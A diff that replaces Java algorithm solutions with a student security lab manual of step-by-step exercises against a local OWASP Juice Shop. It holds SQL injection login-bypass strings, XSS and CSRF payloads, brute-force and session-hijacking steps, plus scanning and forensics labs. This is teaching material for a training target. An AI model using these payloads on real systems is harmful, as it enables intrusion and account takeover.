@@ -1,938 +1,1244 @@
-# Experiment 1 — Subarrays With K Different Integers
+---
 
-```java
-import java.util.*;
+# 🔹 EXPERIMENT 1 — SQL Injection using Burp Suite
 
-class Solution {
-
-    public int subarraysWithKDistinct(int[] nums, int k) {
-        return atMost(nums, k) - atMost(nums, k - 1);
-    }
-
-    private int atMost(int[] nums, int k) {
-
-        Map<Integer, Integer> map = new HashMap<>();
-
-        int left = 0;
-        int ans = 0;
-
-        for (int right = 0; right < nums.length; right++) {
-
-            map.put(nums[right],
-                    map.getOrDefault(nums[right], 0) + 1);
-
-            while (map.size() > k) {
-
-                map.put(nums[left],
-                        map.get(nums[left]) - 1);
-
-                if (map.get(nums[left]) == 0)
-                    map.remove(nums[left]);
-
-                left++;
-            }
-
-            ans += right - left + 1;
-        }
-
-        return ans;
-    }
-
-    public static void main(String[] args) {
-
-        Scanner sc = new Scanner(System.in);
-
-        int n = sc.nextInt();
-        int k = sc.nextInt();
-
-        int[] arr = new int[n];
-
-        for (int i = 0; i < n; i++)
-            arr[i] = sc.nextInt();
-
-        System.out.println(
-                new Solution().subarraysWithKDistinct(arr, k)
-        );
-    }
-}
-```
+## Aim
+To perform SQL Injection attack using Burp Suite on OWASP Juice Shop.
 
 ---
 
-# Experiment 2 — Shortest Subarray With Sum At Least K
+# PART 1 — Setup Juice Shop
 
-```java
-import java.util.*;
+## Step 1: Install Docker
+Open Kali Linux terminal:
 
-class ShortestSubarray {
+sudo apt update
 
-    public int shortestSubarray(int[] nums, int k) {
+sudo apt install docker.io -y
 
-        int n = nums.length;
+sudo systemctl start docker
 
-        long[] prefix = new long[n + 1];
+sudo systemctl enable docker
 
-        for (int i = 0; i < n; i++)
-            prefix[i + 1] = prefix[i] + nums[i];
+Check installation:
+docker --version
 
-        int ans = n + 1;
+Add current user to Docker group:
+sudo usermod -aG docker $USER
 
-        Deque<Integer> dq = new LinkedList<>();
+Restart system:
+reboot
 
-        for (int i = 0; i <= n; i++) {
-
-            while (!dq.isEmpty() &&
-                    prefix[i] - prefix[dq.peekFirst()] >= k)
-
-                ans = Math.min(ans, i - dq.pollFirst());
-
-            while (!dq.isEmpty() &&
-                    prefix[i] <= prefix[dq.peekLast()])
-
-                dq.pollLast();
-
-            dq.offerLast(i);
-        }
-
-        return ans == n + 1 ? -1 : ans;
-    }
-
-    public static void main(String[] args) {
-
-        Scanner sc = new Scanner(System.in);
-
-        int n = sc.nextInt();
-        int k = sc.nextInt();
-
-        int[] arr = new int[n];
-
-        for (int i = 0; i < n; i++)
-            arr[i] = sc.nextInt();
-
-        System.out.println(
-                new ShortestSubarray().shortestSubarray(arr, k)
-        );
-    }
-}
-```
+Test Docker:
+docker run hello-world
 
 ---
 
-# Experiment 3 — Segment Tree
+## Step 2: Download OWASP Juice Shop
 
-```java
-import java.util.*;
-
-class SegmentTree {
-
-    int[] tree;
-    int n;
-
-    SegmentTree(int[] arr) {
-
-        n = arr.length;
-
-        tree = new int[4 * n];
-
-        build(arr, 0, 0, n - 1);
-    }
-
-    void build(int[] arr, int node, int start, int end) {
-
-        if (start == end) {
-            tree[node] = arr[start];
-            return;
-        }
-
-        int mid = (start + end) / 2;
-
-        build(arr, 2 * node + 1, start, mid);
-        build(arr, 2 * node + 2, mid + 1, end);
-
-        tree[node] =
-                tree[2 * node + 1] +
-                tree[2 * node + 2];
-    }
-
-    int query(int node,
-              int start,
-              int end,
-              int left,
-              int right) {
-
-        if (right < start || end < left)
-            return 0;
-
-        if (left <= start && end <= right)
-            return tree[node];
-
-        int mid = (start + end) / 2;
-
-        return query(2 * node + 1,
-                     start,
-                     mid,
-                     left,
-                     right)
-
-                +
-
-               query(2 * node + 2,
-                     mid + 1,
-                     end,
-                     left,
-                     right);
-    }
-
-    int sumRange(int left, int right) {
-        return query(0, 0, n - 1, left, right);
-    }
-
-    public static void main(String[] args) {
-
-        Scanner sc = new Scanner(System.in);
-
-        int n = sc.nextInt();
-
-        int[] arr = new int[n];
-
-        for (int i = 0; i < n; i++)
-            arr[i] = sc.nextInt();
-
-        int l = sc.nextInt();
-        int r = sc.nextInt();
-
-        SegmentTree st = new SegmentTree(arr);
-
-        System.out.println(st.sumRange(l, r));
-    }
-}
-```
+docker pull bkimminich/juice-shop
 
 ---
 
-# Experiment 4 — Treap
+## Step 3: Run Juice Shop
 
-```java
-import java.util.*;
-
-class Solution {
-
-    class Node {
-
-        int key;
-        int priority;
-        int size;
-
-        Node left, right;
-
-        Node(int key) {
-
-            this.key = key;
-            this.priority = new Random().nextInt();
-            this.size = 1;
-        }
-    }
-
-    int size(Node root) {
-        return root == null ? 0 : root.size;
-    }
-
-    void update(Node root) {
-
-        if (root != null)
-            root.size =
-                    1 +
-                    size(root.left) +
-                    size(root.right);
-    }
-
-    Node rotateRight(Node y) {
-
-        Node x = y.left;
-
-        y.left = x.right;
-        x.right = y;
-
-        update(y);
-        update(x);
-
-        return x;
-    }
-
-    Node rotateLeft(Node x) {
-
-        Node y = x.right;
-
-        x.right = y.left;
-        y.left = x;
-
-        update(x);
-        update(y);
-
-        return y;
-    }
-
-    Node insert(Node root, int key) {
-
-        if (root == null)
-            return new Node(key);
-
-        if (key < root.key) {
-
-            root.left = insert(root.left, key);
-
-            if (root.left.priority > root.priority)
-                root = rotateRight(root);
-
-        } else {
-
-            root.right = insert(root.right, key);
-
-            if (root.right.priority > root.priority)
-                root = rotateLeft(root);
-        }
-
-        update(root);
-
-        return root;
-    }
-
-    int countGreater(Node root, long value) {
-
-        if (root == null)
-            return 0;
-
-        if (root.key <= value)
-            return countGreater(root.right, value);
-
-        return 1 +
-               size(root.right) +
-               countGreater(root.left, value);
-    }
-
-    public int reversePairs(int[] nums) {
-
-        Node root = null;
-
-        int count = 0;
-
-        for (int num : nums) {
-
-            count += countGreater(root, 2L * num);
-
-            root = insert(root, num);
-        }
-
-        return count;
-    }
-
-    public static void main(String[] args) {
-
-        Scanner sc = new Scanner(System.in);
-
-        int n = sc.nextInt();
-
-        int[] arr = new int[n];
-
-        for (int i = 0; i < n; i++)
-            arr[i] = sc.nextInt();
-
-        System.out.println(
-                new Solution().reversePairs(arr)
-        );
-    }
-}
-```
+docker run -d -p 3000:3000 bkimminich/juice-shop
 
 ---
 
-# Experiment 5 — Fenwick Tree
+## Step 4: Open Application
 
-```java
-import java.util.*;
-
-class NumArray {
-
-    int[] bit;
-    int n;
-
-    NumArray(int[] nums) {
-
-        n = nums.length;
-
-        bit = new int[n + 1];
-
-        for (int i = 0; i < n; i++)
-            update(i, nums[i]);
-    }
-
-    void update(int index, int val) {
-
-        index++;
-
-        while (index <= n) {
-
-            bit[index] += val;
-
-            index += index & -index;
-        }
-    }
-
-    int sum(int index) {
-
-        int res = 0;
-
-        index++;
-
-        while (index > 0) {
-
-            res += bit[index];
-
-            index -= index & -index;
-        }
-
-        return res;
-    }
-
-    int sumRange(int left, int right) {
-        return sum(right) - sum(left - 1);
-    }
-
-    public static void main(String[] args) {
-
-        Scanner sc = new Scanner(System.in);
-
-        int n = sc.nextInt();
-
-        int[] nums = new int[n];
-
-        for (int i = 0; i < n; i++)
-            nums[i] = sc.nextInt();
-
-        int l = sc.nextInt();
-        int r = sc.nextInt();
-
-        NumArray na = new NumArray(nums);
-
-        System.out.println(na.sumRange(l, r));
-    }
-}
-```
+Open browser:
+http://localhost:3000
 
 ---
 
-# Experiment 6 — Topological Sort
+# PART 2 — Burp Suite Setup
 
-```java
-import java.util.*;
+## Step 5: Open Burp Suite
 
-class Graph {
+Open terminal:
+burpsuite
 
-    int V;
-
-    ArrayList<ArrayList<Integer>> adj;
-
-    Graph(int v) {
-
-        V = v;
-
-        adj = new ArrayList<>();
-
-        for (int i = 0; i < v; i++)
-            adj.add(new ArrayList<>());
-    }
-
-    void addEdge(int u, int v) {
-        adj.get(u).add(v);
-    }
-
-    void dfs(int node,
-             boolean[] visited,
-             Stack<Integer> stack) {
-
-        visited[node] = true;
-
-        for (int next : adj.get(node))
-
-            if (!visited[next])
-                dfs(next, visited, stack);
-
-        stack.push(node);
-    }
-
-    void topologicalSort() {
-
-        boolean[] visited = new boolean[V];
-
-        Stack<Integer> stack = new Stack<>();
-
-        for (int i = 0; i < V; i++)
-
-            if (!visited[i])
-                dfs(i, visited, stack);
-
-        while (!stack.isEmpty())
-            System.out.print(stack.pop() + " ");
-    }
-
-    public static void main(String[] args) {
-
-        Graph g = new Graph(6);
-
-        g.addEdge(5, 2);
-        g.addEdge(5, 0);
-        g.addEdge(4, 0);
-        g.addEdge(4, 1);
-        g.addEdge(2, 3);
-        g.addEdge(3, 1);
-
-        g.topologicalSort();
-    }
-}
-```
+- Select Temporary Project
+- Click Start Burp
 
 ---
 
-# Experiment 7 — Articulation Points
+## Step 6: Open Burp Browser
 
-```java
-import java.util.*;
-
-class Graph {
-
-    static int time = 0;
-
-    static void addEdge(
-            ArrayList<ArrayList<Integer>> adj,
-            int u,
-            int v) {
-
-        adj.get(u).add(v);
-        adj.get(v).add(u);
-    }
-
-    static void dfs(
-            ArrayList<ArrayList<Integer>> adj,
-            int u,
-            boolean[] visited,
-            int[] disc,
-            int[] low,
-            int parent,
-            boolean[] ap) {
-
-        visited[u] = true;
-
-        disc[u] = low[u] = ++time;
-
-        int children = 0;
-
-        for (int v : adj.get(u)) {
-
-            if (!visited[v]) {
-
-                children++;
-
-                dfs(adj,
-                    v,
-                    visited,
-                    disc,
-                    low,
-                    u,
-                    ap);
-
-                low[u] = Math.min(low[u], low[v]);
-
-                if (parent != -1 &&
-                    low[v] >= disc[u])
-
-                    ap[u] = true;
-
-            } else if (v != parent) {
-
-                low[u] = Math.min(low[u], disc[v]);
-            }
-        }
-
-        if (parent == -1 && children > 1)
-            ap[u] = true;
-    }
-
-    static void articulationPoints(
-            ArrayList<ArrayList<Integer>> adj,
-            int V) {
-
-        boolean[] visited = new boolean[V];
-
-        boolean[] ap = new boolean[V];
-
-        int[] disc = new int[V];
-        int[] low = new int[V];
-
-        for (int i = 0; i < V; i++)
-
-            if (!visited[i])
-                dfs(adj,
-                    i,
-                    visited,
-                    disc,
-                    low,
-                    -1,
-                    ap);
-
-        for (int i = 0; i < V; i++)
-
-            if (ap[i])
-                System.out.print(i + " ");
-    }
-
-    public static void main(String[] args) {
-
-        int V = 5;
-
-        ArrayList<ArrayList<Integer>> adj =
-                new ArrayList<>();
-
-        for (int i = 0; i < V; i++)
-            adj.add(new ArrayList<>());
-
-        addEdge(adj, 1, 0);
-        addEdge(adj, 0, 2);
-        addEdge(adj, 2, 1);
-        addEdge(adj, 0, 3);
-        addEdge(adj, 3, 4);
-
-        articulationPoints(adj, V);
-    }
-}
-```
+In Burp:
+- Proxy → Open Browser
 
 ---
 
-# Experiment 8 — Permutation Palindrome
+## Step 7: Open Login Page
 
-```java
-import java.util.*;
+In Burp browser open:
 
-class PermutationPalindrome {
-
-    public boolean canPermutePalindrome(String s) {
-
-        int[] freq = new int[26];
-
-        for (char c : s.toCharArray())
-            freq[c - 'a']++;
-
-        int odd = 0;
-
-        for (int x : freq)
-
-            if (x % 2 != 0)
-                odd++;
-
-        return odd <= 1;
-    }
-
-    public static void main(String[] args) {
-
-        Scanner sc = new Scanner(System.in);
-
-        System.out.println(
-                new PermutationPalindrome()
-                        .canPermutePalindrome(sc.next())
-        );
-    }
-}
-```
+http://localhost:3000/#/login
 
 ---
 
-# Experiment 9 — Index Pairs Of String
+# PART 3 — SQL Injection Attack
 
-```java
-import java.util.*;
+## Step 8: Enter Dummy Credentials
 
-class Solution {
+Email:
+admin
 
-    public int[][] indexPairs(
-            String text,
-            String[] words) {
+Password:
+password
 
-        List<int[]> list = new ArrayList<>();
-
-        for (String word : words) {
-
-            int index = text.indexOf(word);
-
-            while (index != -1) {
-
-                list.add(
-                        new int[]{
-                                index,
-                                index + word.length() - 1
-                        }
-                );
-
-                index = text.indexOf(word, index + 1);
-            }
-        }
-
-        list.sort((a, b) ->
-                a[0] == b[0]
-                        ? a[1] - b[1]
-                        : a[0] - b[0]);
-
-        int[][] ans = new int[list.size()][2];
-
-        for (int i = 0; i < list.size(); i++)
-            ans[i] = list.get(i);
-
-        return ans;
-    }
-
-    public static void main(String[] args) {
-
-        Scanner sc = new Scanner(System.in);
-
-        String text = sc.nextLine();
-
-        String[] words =
-                sc.nextLine().split(" ");
-
-        int[][] result =
-                new Solution().indexPairs(text, words);
-
-        for (int[] pair : result)
-            System.out.println(
-                    pair[0] + " " + pair[1]
-            );
-    }
-}
-```
+Click Login
 
 ---
 
-# Experiment 10 — Lowest Common Ancestor
+## Step 9: Capture Request
 
-```java
-class TreeNode {
-
-    int val;
-
-    TreeNode left, right;
-
-    TreeNode(int val) {
-        this.val = val;
-    }
-}
-
-class Solution {
-
-    public TreeNode lowestCommonAncestor(
-            TreeNode root,
-            TreeNode p,
-            TreeNode q) {
-
-        if (root == null ||
-            root == p ||
-            root == q)
-
-            return root;
-
-        TreeNode left =
-                lowestCommonAncestor(root.left, p, q);
-
-        TreeNode right =
-                lowestCommonAncestor(root.right, p, q);
-
-        if (left != null && right != null)
-            return root;
-
-        return left != null ? left : right;
-    }
-
-    public static void main(String[] args) {
-
-        TreeNode root = new TreeNode(3);
-
-        root.left = new TreeNode(5);
-        root.right = new TreeNode(1);
-
-        root.left.left = new TreeNode(6);
-        root.left.right = new TreeNode(2);
-
-        Solution s = new Solution();
-
-        TreeNode ans =
-                s.lowestCommonAncestor(
-                        root,
-                        root.left,
-                        root.right
-                );
-
-        System.out.println(ans.val);
-    }
-}
-```
+In Burp:
+- Go to HTTP History
+- Find:
+  /rest/user/login
 
 ---
 
-# Experiment 11 — Longest Increasing Path In Matrix
+## Step 10: Send to Intruder
 
-```java
-import java.util.*;
-
-class Solution {
-
-    int[][] dirs = {
-            {1, 0},
-            {-1, 0},
-            {0, 1},
-            {0, -1}
-    };
-
-    public int longestIncreasingPath(int[][] matrix) {
-
-        int m = matrix.length;
-        int n = matrix[0].length;
-
-        int[][] dp = new int[m][n];
-
-        int ans = 0;
-
-        for (int i = 0; i < m; i++)
-
-            for (int j = 0; j < n; j++)
-
-                ans = Math.max(
-                        ans,
-                        dfs(matrix, dp, i, j)
-                );
-
-        return ans;
-    }
-
-    private int dfs(
-            int[][] matrix,
-            int[][] dp,
-            int i,
-            int j) {
-
-        if (dp[i][j] != 0)
-            return dp[i][j];
-
-        int max = 1;
-
-        for (int[] d : dirs) {
-
-            int x = i + d[0];
-            int y = j + d[1];
-
-            if (x >= 0 &&
-                y >= 0 &&
-                x < matrix.length &&
-                y < matrix[0].length &&
-                matrix[x][y] > matrix[i][j]) {
-
-                max = Math.max(
-                        max,
-                        1 + dfs(matrix, dp, x, y)
-                );
-            }
-        }
-
-        return dp[i][j] = max;
-    }
-
-    public static void main(String[] args) {
-
-        Scanner sc = new Scanner(System.in);
-
-        int m = sc.nextInt();
-        int n = sc.nextInt();
-
-        int[][] matrix = new int[m][n];
-
-        for (int i = 0; i < m; i++)
-
-            for (int j = 0; j < n; j++)
-                matrix[i][j] = sc.nextInt();
-
-        System.out.println(
-                new Solution()
-                        .longestIncreasingPath(matrix)
-        );
-    }
-}
-```
+Right-click request:
+Send to Intruder
 
 ---
 
-# Experiment 12 — Lexicographically Smallest Equivalent String
+## Step 11: Configure Positions
 
-```java
-import java.util.*;
+Go to:
+Intruder → Positions
 
-class Solution {
+Click:
+Clear §
 
-    int[] parent = new int[26];
+Highlight:
+"email":"admin"
 
-    int find(int x) {
+Click:
+Add §
 
-        if (parent[x] != x)
-            parent[x] = find(parent[x]);
+Now:
+"email":"§admin§"
 
-        return parent[x];
-    }
+---
 
-    void union(int a, int b) {
+## Step 12: Add SQL Payloads
 
-        int pa = find(a);
-        int pb = find(b);
+Go to:
+Payloads tab
 
-        if (pa < pb)
-            parent[pb] = pa;
-        else
-            parent[pa] = pb;
-    }
+Payload examples:
 
-    public String smallestEquivalentString(
-            String A,
-            String B,
-            String S) {
+' OR 1=1 --
+' OR '1'='1
+admin' --
+' OR 1=1#
+' OR ''='
 
-        for (int i = 0; i < 26; i++)
-            parent[i] = i;
+---
 
-        for (int i = 0; i < A.length(); i++)
+## Step 13: Disable URL Encoding
 
-            union(
-                    A.charAt(i) - 'a',
-                    B.charAt(i) - 'a'
-            );
+Uncheck:
+URL Encode these characters
 
-        StringBuilder sb = new StringBuilder();
+---
 
-        for (char c : S.toCharArray())
+## Step 14: Start Attack
 
-            sb.append(
-                    (char)(find(c - 'a') + 'a')
-            );
+Click:
+Start Attack
 
-        return sb.toString();
-    }
+---
 
-    public static void main(String[] args) {
+## Step 15: Analyze Responses
 
-        Scanner sc = new Scanner(System.in);
+Look for:
+Status Code = 200
 
-        String A = sc.next();
-        String B = sc.next();
-        String S = sc.next();
+If found:
+SQL Injection successful
 
-        System.out.println(
-                new Solution()
-                        .smallestEquivalentString(A, B, S)
-        );
-    }
-}
-```
+---
+
+## Step 16: Extract Token
+
+Open successful response
+
+Find:
+authentication token
+
+Copy JWT token
+
+---
+
+## Step 17: Decode Token
+
+Go to:
+Decoder tab
+
+Paste token
+
+Decode Base64
+
+---
+
+## Step 18: Extract Credentials
+
+Possible output:
+email: admin@juice-sh.op
+password: admin123
+
+---
+
+## Step 19: Login
+
+Use extracted credentials
+
+Successfully login
+
+---
+
+## Result
+
+SQL Injection vulnerability successfully exploited.
+
+---
+
+# 🔹 EXPERIMENT 2 — Cross Site Scripting (XSS)
+
+## Aim
+To perform reflected and stored XSS attacks.
+
+---
+
+# PART 1 — Setup
+
+## Step 1: Run Juice Shop
+
+docker pull bkimminich/juice-shop
+
+docker run -d -p 3000:3000 bkimminich/juice-shop
+
+---
+
+## Step 2: Open Juice Shop
+
+http://localhost:3000
+
+---
+
+## Step 3: Open Burp Suite
+
+- Proxy → Intercept OFF
+
+---
+
+## Step 4: Configure Proxy
+
+Set browser proxy:
+
+IP:
+127.0.0.1
+
+Port:
+8081
+
+---
+
+## Step 5: Verify Burp Connection
+
+Open:
+http://localhost:3000
+
+Requests should appear in HTTP History
+
+---
+
+# PART 2 — Reflected XSS
+
+## Step 6: Find Input Fields
+
+Search bars
+Feedback forms
+Login forms
+
+---
+
+## Step 7: Send Request to Repeater
+
+Proxy → HTTP History
+
+Right-click request:
+Send to Repeater
+
+---
+
+## Step 8: Inject Payload
+
+Payload:
+
+<script>alert("XSS")</script>
+
+---
+
+## Step 9: Send Request
+
+Click Send
+
+If popup appears:
+XSS successful
+
+---
+
+# PART 3 — Stored XSS
+
+## Step 10: Open Feedback Form
+
+Go to:
+Contact Us / Feedback
+
+---
+
+## Step 11: Enter Payload
+
+<script>document.write('<img src=x onerror=alert("Stored XSS")>');</script>
+
+---
+
+## Step 12: Submit Form
+
+Reload page
+
+If popup appears:
+Stored XSS successful
+
+---
+
+## Result
+
+Reflected and Stored XSS attacks demonstrated successfully.
+
+---
+
+# 🔹 EXPERIMENT 3 — Broken Authentication & Session Management
+
+## Aim
+To identify authentication and session vulnerabilities.
+
+---
+
+# PART 1 — Setup
+
+## Step 1: Install Docker
+
+sudo apt update
+
+sudo apt install docker.io -y
+
+sudo systemctl start docker
+
+sudo systemctl enable docker
+
+---
+
+## Step 2: Run Juice Shop
+
+sudo docker run -d -p 3000:3000 --name juice-shop bkimminich/juice-shop
+
+Check:
+sudo docker ps
+
+---
+
+## Step 3: Open Application
+
+http://localhost:3000
+
+---
+
+## Step 4: Configure Burp
+
+- Proxy → Intercept ON
+
+Browser proxy:
+IP: 127.0.0.1
+Port: 8080
+
+---
+
+# PART 2 — Authentication Testing
+
+## Test 1: SQL Injection Login Bypass
+
+### Step 1:
+Open Login page
+
+### Step 2:
+Enter:
+
+Email:
+' OR 1=1 --
+
+Password:
+anything
+
+### Step 3:
+Forward request
+
+If login succeeds:
+SQL Injection vulnerability exists
+
+---
+
+## Test 2: Weak Password Policy
+
+### Step 1:
+Register account
+
+### Step 2:
+Use password:
+12345
+
+If accepted:
+Weak password policy exists
+
+---
+
+## Test 3: Brute Force Attack
+
+### Step 1:
+Capture login request
+
+### Step 2:
+Send to Intruder
+
+### Step 3:
+Select password field
+
+### Step 4:
+Load wordlist:
+
+/usr/share/wordlists/rockyou.txt
+
+### Step 5:
+Start attack
+
+If password found:
+No rate limiting vulnerability exists
+
+---
+
+## Test 4: Username Enumeration
+
+### Step 1:
+Use valid email + wrong password
+
+### Step 2:
+Use invalid email + wrong password
+
+If messages differ:
+Username enumeration vulnerability exists
+
+---
+
+# PART 3 — Session Management Testing
+
+## Test 5: Session Cookie Analysis
+
+### Step 1:
+Login
+
+### Step 2:
+Press F12
+
+Go:
+Application → Cookies
+
+Check:
+- Session token
+- HTTPOnly
+- Secure flags
+
+---
+
+## Test 6: Session Hijacking
+
+### Step 1:
+Copy session cookie
+
+### Step 2:
+Open another browser
+
+### Step 3:
+Replace cookie
+
+If access granted:
+Session hijacking possible
+
+---
+
+## Test 7: Session Fixation
+
+### Step 1:
+Note session ID before login
+
+### Step 2:
+Login
+
+### Step 3:
+Compare session IDs
+
+If same:
+Session fixation vulnerability exists
+
+---
+
+## Test 8: Logout Mechanism
+
+### Step 1:
+Copy cookie
+
+### Step 2:
+Logout
+
+### Step 3:
+Reuse cookie
+
+If session works:
+Logout invalidation vulnerability exists
+
+---
+
+## Test 9: JWT Token Analysis
+
+### Step 1:
+Copy JWT token
+
+### Step 2:
+Go to:
+https://jwt.io
+
+### Step 3:
+Paste token
+
+Analyze payload
+
+---
+
+## Result
+
+Authentication and session vulnerabilities successfully identified.
+
+---
+
+# 🔹 EXPERIMENT 4 — Cross Site Request Forgery (CSRF)
+
+## Aim
+To perform CSRF attack in OWASP Juice Shop.
+
+---
+
+# PART 1 — Setup
+
+## Step 1: Start Juice Shop
+
+docker run -d -p 3000:3000 bkimminich/juice-shop
+
+---
+
+## Step 2: Login
+
+Open:
+http://localhost:3000
+
+Login using valid account
+
+---
+
+## Step 3: Keep Session Active
+
+Do NOT logout
+
+---
+
+# PART 2 — Capture Legitimate Request
+
+## Step 4: Open Network Tab
+
+Press:
+F12 → Network
+
+---
+
+## Step 5: Change Profile
+
+Modify profile info
+
+Observe request:
+
+POST /rest/user/profile
+
+---
+
+# PART 3 — Create CSRF Attack
+
+## Step 6: Create HTML File
+
+Create:
+csrf.html
+
+Paste:
+
+<html>
+<head>
+<title>CSRF Attack Demo</title>
+</head>
+
+<body onload="document.forms[0].submit()">
+
+<form action="http://localhost:3000/rest/user/profile" method="POST">
+
+<input type="hidden" name="username" value="student">
+
+<input type="hidden" name="email" value="attacker@example.com">
+
+</form>
+
+</body>
+</html>
+
+---
+
+## Step 7: Save File
+
+Save as:
+csrf.html
+
+---
+
+## Step 8: Execute Attack
+
+Open csrf.html in browser
+
+Since victim is logged in:
+Request automatically executes
+
+---
+
+## Step 9: Verify Attack
+
+Check profile/email changed
+
+---
+
+## Result
+
+CSRF attack successfully demonstrated.
+
+---
+
+# 🔹 EXPERIMENT 10 — Password Strength Checker using Python
+
+## Aim
+To classify passwords as Weak, Medium, or Strong.
+
+---
+
+# PART 1 — Create Program
+
+## Step 1: Open VS Code or Terminal
+
+Create file:
+password_checker.py
+
+---
+
+## Step 2: Paste Code
+
+import re
+
+def check_password_strength(password):
+
+    if len(password) < 8:
+        return "Weak: Password must be at least 8 characters long."
+
+    if not any(char.isdigit() for char in password):
+        return "Weak: Password must include at least one number."
+
+    if not any(char.isupper() for char in password):
+        return "Weak: Password must include at least one uppercase letter."
+
+    if not any(char.islower() for char in password):
+        return "Weak: Password must include at least one lowercase letter."
+
+    if not re.search(r'[!@#$%^&*(),.?":{}|<>]', password):
+        return "Medium: Add special characters to make your password stronger."
+
+    return "Strong: Your password is secure!"
+
+def password_checker():
+
+    print("Welcome to the Password Strength Checker!")
+
+    while True:
+
+        password = input("\nEnter your password (or type 'exit' to quit): ")
+
+        if password.lower() == "exit":
+            print("Thank you for using the Password Strength Checker! Goodbye!")
+            break
+
+        result = check_password_strength(password)
+        print(result)
+
+if __name__ == "__main__":
+    password_checker()
+
+---
+
+# PART 2 — Run Program
+
+## Step 3: Open Terminal
+
+Navigate to file location:
+
+cd <folder_path>
+
+---
+
+## Step 4: Run Program
+
+python password_checker.py
+
+---
+
+# PART 3 — Test Passwords
+
+## Weak Password
+
+Input:
+abc123
+
+Output:
+Weak: Password must be at least 8 characters long.
+
+---
+
+## Medium Password
+
+Input:
+Abcdef12
+
+Output:
+Medium: Add special characters to make your password stronger.
+
+---
+
+## Strong Password
+
+Input:
+Abc@1234
+
+Output:
+Strong: Your password is secure!
+
+---
+
+## Step 5: Exit Program
+
+Type:
+exit
+
+---
+
+## Result
+
+Password strength successfully analyzed using Python.
+
+---
+
+---
+
+# 🔹 EXPERIMENT 15 — Android App Traffic Analysis (Burp Suite)
+
+## Aim
+To intercept and analyze HTTP & HTTPS traffic from an Android emulator.
+
+---
+
+## Step 1: Install Android Studio
+- Download from: https://developer.android.com/studio
+- Install with default settings
+
+---
+
+## Step 2: Create Emulator
+- Open Android Studio → AVD Manager
+- Click "Create Virtual Device"
+- Choose device (Pixel 2 or Pixel 9)
+- Download system image → Finish
+
+---
+
+## Step 3: Start Emulator with Proxy
+Open terminal:
+cd ~/Android/Sdk/emulator
+./emulator -list-avds
+./emulator -avd Pixel_9 -http-proxy http://10.0.2.2:8080
+
+---
+
+## Step 4: Configure Proxy via ADB
+cd ~/Android/Sdk/platform-tools
+adb devices
+adb shell settings put global http_proxy 10.0.2.2:8080
+
+---
+
+## Step 5: Setup Burp Suite
+- Open Burp Suite
+- Proxy → Options → set listener to ALL INTERFACES
+- Proxy → Intercept → ON
+
+---
+
+## Step 6: Capture HTTP Traffic
+- Open Chrome in emulator
+- Visit any site (example.com)
+- Check Burp → HTTP History
+
+---
+
+## Step 7: Enable HTTPS Interception
+- In Burp: Proxy → Options → Export CA Certificate (DER format)
+
+Push to emulator:
+adb push burpcer.der /sdcard/Download/
+
+Install:
+Settings → Security → Install Certificate → CA Certificate
+
+---
+
+## Step 8: Verify
+- Open HTTPS site (https://example.com)
+- Check Burp → traffic visible
+
+---
+
+## Result
+Successfully intercepted Android HTTP & HTTPS traffic
+
+---
+
+# 🔹 EXPERIMENT 16 — IoT Device Security Testing
+
+## Aim
+To detect open ports, services, and weak authentication.
+
+---
+
+## Step 1: Run Vulnerable App
+docker run -d -p 8090:3000 bkimminich/juice-shop
+
+---
+
+## Step 2: Find Host IP
+On Windows:
+ipconfig
+
+---
+
+## Step 3: Scan Using Kali
+start kali linux vm
+nmap -sV <target_ip>
+
+---
+
+## Step 4: Analyze Results
+Check:
+- Open ports
+- Services running
+- Version info
+
+---
+
+## Step 5: Access Dashboard
+Open browser:
+http://<target_ip>:8090
+
+---
+
+## Step 6: Test Credentials
+Try:
+admin@juice-sh.op / admin123
+
+---
+
+## Step 7: Check Traffic
+- Open DevTools → Network
+- Observe HTTP (plaintext)
+
+---
+
+## Result
+Identified open ports, weak passwords, unencrypted traffic
+
+---
+
+# 🔹 EXPERIMENT 17 — Disk Imaging & Forensics (Corrected)
+
+## Aim
+To create and analyze a forensic disk image
+
+---
+
+## PART 1: Create Disk & Evidence
+Go to Kali linux VM
+### Step 1: Create Disk
+dd if=/dev/zero of=practice_disk.dd bs=1M count=100
+
+### Step 2: Format Disk
+mkfs.ext4 practice_disk.dd
+
+### Step 3: Create Mount Folder
+sudo mkdir /mnt/practice
+
+### Step 4: Mount Disk
+sudo mount -o loop practice_disk.dd /mnt/practice
+
+### Step 5: Create Evidence File
+echo "Cybersecurity Lab Evidence" | sudo tee /mnt/practice/evidence.txt
+
+### Step 6: Verify
+ls /mnt/practice
+
+### Step 7: Unmount Disk
+sudo umount /mnt/practice
+
+---
+
+## PART 2: Create Forensic Image
+
+### Step 8: Create Image
+sudo dd if=practice_disk.dd of=disk_image.dd bs=4M
+
+### Step 9: Verify
+ls
+
+---
+
+## PART 3: Analyze Using Autopsy
+
+### Step 10: Start Autopsy
+sudo autopsy
+
+Open:
+http://localhost:9999/autopsy
+
+---
+
+### Step 11: Create Case
+- New Case → Name: Lab1 → Next → Next
+
+---
+
+### Step 12: Add Image
+Path:
+/home/kali/disk_image.dd
+
+Select:
+✔ Partition  
+✔ Symlink  
+
+---
+
+### Step 13: Enable Hash
+✔ Calculate hash value → Add → OK
+
+---
+
+### Step 14: Analyze
+Click ANALYZE
+
+---
+
+## PART 4: Find Evidence
+
+### Step 15: File Analysis
+- Open File Analysis
+- Navigate folders
+- Open evidence.txt
+
+Output:
+Cybersecurity Lab Evidence
+
+---
+
+### Step 16: Keyword Search (Optional)
+Search: Cybersecurity
+
+---
+
+## Result
+✔ Disk image created  
+✔ Evidence recovered  
+✔ Hash verified  
+
+---
+
+# 🔹 EXPERIMENT 18 — Log File Analysis
+
+## Step 1: Open Logs
+cd /var/log
+ls
+
+---
+
+## Step 2: View Logs
+journalctl | less
+
+---
+
+## Step 3: Failed Logins
+journalctl | grep "Failed"
+
+---
+
+## Step 4: SSH Activity
+journalctl | grep ssh
+
+---
+
+## Step 5: Extract Suspicious IP
+journalctl | grep "Failed password" | awk '{print $11}'
+
+---
+
+## Step 6: Count Attempts
+journalctl | grep "Failed password" | awk '{print $11}' | sort | uniq -c | sort -nr
+
+---
+
+## Step 7: Simulate Attack
+sudo apt install openssh-server -y
+sudo service ssh start
+ssh fakeuser@localhost
+
+---
+
+## Result
+Detected brute-force attempts from logs
+
+---
+
+# 🔹 EXPERIMENT 19 — Network Forensics (Wireshark)
+
+## Step 1: Start Wireshark
+wireshark &
+
+---
+
+## Step 2: Select Interface
+Choose eth0 or wlan0
+
+---
+
+## Step 3: Apply Filters
+tcp
+udp
+http
+ip.addr == <IP>
+
+---
+
+## Step 4: Follow Stream
+Right click → Follow → TCP Stream
+
+---
+
